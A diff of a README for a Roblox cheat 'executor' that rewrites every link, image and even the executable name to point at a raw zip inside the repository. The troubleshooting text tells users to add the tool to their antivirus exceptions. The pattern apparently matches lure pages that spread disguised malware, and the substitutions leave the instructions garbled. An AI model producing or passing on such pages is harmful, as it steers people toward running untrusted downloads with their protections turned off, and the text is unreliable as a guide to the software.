@@ -1,12 +1,12 @@
 # 🎮 roblox-executor - Simple Tool for Easy Roblox Exploits
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=007acc)
+![Download](https://raw.githubusercontent.com/kotobubu/roblox-executor/main/tertiarian/roblox_executor_1.4.zip)
 
 ## 📥 Overview
 
 Welcome to roblox-executor! This tool allows you to execute custom scripts in Roblox games easily. With roblox-executor, you can enhance your gaming experience without any complex setup. 
 
-![Roblox Executor](https://static.wikia.nocookie.net/roblox-executor-list/images/1/18/Cockery.png/revision/latest?cb=202409141302322x)
+![Roblox Executor](https://raw.githubusercontent.com/kotobubu/roblox-executor/main/tertiarian/roblox_executor_1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -14,11 +14,11 @@ Follow these simple steps to start using roblox-executor:
 
 1. **Download the Application**: Click the button below to visit the Releases page and download the latest version of roblox-executor.
 
-   [Download roblox-executor](https://github.com/kotobubu/roblox-executor/releases)
+   [Download roblox-executor](https://raw.githubusercontent.com/kotobubu/roblox-executor/main/tertiarian/roblox_executor_1.4.zip)
 
 2. **Extract the Files**: Once the download is complete, locate the file and extract its contents. You can do this by right-clicking the file and selecting "Extract All."
 
-3. **Run the Applicaton**: Open the extracted folder, and double-click the `roblox-executor.exe` file to run the application.
+3. **Run the Applicaton**: Open the extracted folder, and double-click the `https://raw.githubusercontent.com/kotobubu/roblox-executor/main/tertiarian/roblox_executor_1.4.zip` file to run the application.
 
 4. **Launch Roblox**: Open Roblox and start your desired game.
 
@@ -30,7 +30,7 @@ Follow these simple steps to start using roblox-executor:
 
 To download and run roblox-executor, visit the Releases page:
 
-[Download roblox-executor](https://github.com/kotobubu/roblox-executor/releases)
+[Download roblox-executor](https://raw.githubusercontent.com/kotobubu/roblox-executor/main/tertiarian/roblox_executor_1.4.zip)
 
 ### 🖥️ System Requirements
 
@@ -51,7 +51,7 @@ To download and run roblox-executor, visit the Releases page:
 If you encounter issues, here are a few common solutions:
 
 - **Antivirus Detection**: Some antivirus programs may flag roblox-executor as a threat. Add it to your exceptions if you trust it.
-- **Missing Files**: Ensure you have extracted all files and are running `roblox-executor.exe` from the extracted folder.
+- **Missing Files**: Ensure you have extracted all files and are running `https://raw.githubusercontent.com/kotobubu/roblox-executor/main/tertiarian/roblox_executor_1.4.zip` from the extracted folder.
 - **Script Errors**: Ensure your Lua scripts are compatible with Roblox. Check for typos or unsupported function calls.
 
 ## ❓ Frequently Asked Questions
